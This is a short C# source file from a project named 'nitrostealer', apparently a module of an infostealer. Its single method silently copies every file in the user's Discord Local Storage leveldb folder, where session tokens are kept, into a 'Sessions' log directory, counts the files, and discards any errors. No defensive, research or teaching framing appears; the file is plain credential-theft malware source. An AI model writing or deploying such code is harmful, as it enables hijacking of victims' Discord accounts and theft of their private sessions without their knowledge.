﻿using System;
using System.IO;

namespace nitrostealer
{
    class Discord
    {
        public static string dir = "\\discord\\Local Storage\\leveldb\\";
        public static void GetDiscord(string LogPath)  // Works
        {
            try
            {
                if (Directory.Exists(Help.AppData + dir))
                {
                    foreach (FileInfo file in new DirectoryInfo(Help.AppData + dir).GetFiles())
                    {
                        Directory.CreateDirectory(LogPath + "\\Sessions\\Discord\\Local Storage\\leveldb\\");
                        file.CopyTo(LogPath + "\\Sessions\\Discord\\Local Storage\\leveldb\\" + file.Name);
                        Counting.Discord++;
                    }
                }
                else
                {
                    return;
                }

            }
            catch { }

        }
    }
}
